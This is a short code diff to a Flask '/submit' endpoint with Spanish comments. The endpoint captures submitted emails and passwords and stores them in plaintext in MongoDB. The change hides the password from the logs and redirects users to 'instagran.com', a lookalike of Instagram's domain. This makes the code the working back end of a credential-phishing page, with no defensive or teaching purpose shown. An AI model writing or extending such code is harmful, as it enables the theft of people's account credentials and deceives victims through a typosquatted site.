@@ -31,11 +31,13 @@ def submit():
         email = request.form.get('email')
         #password = request.form['password']
         password = request.form.get('password')
-        logger.info(f"Datos recibidos en /submit: email={email}, password={password}")
+        #logger.info(f"Datos recibidos en /submit: email={email}, password={password}")
 
         collection.insert_one({"email": email, "password": password})
         logger.info("Datos almacenados correctamente en MongoDB.")
-        return jsonify({"message": "Credenciales almacenadas correctamente"}), 200
+        
+        #return jsonify({"message": "Credenciales almacenadas correctamente"}), 200
+        return redirect("https://instagran.com")
     except Exception as e:
         logger.error(f"Error al almacenar credenciales: {e}")
         return jsonify({"error": str(e)}), 500
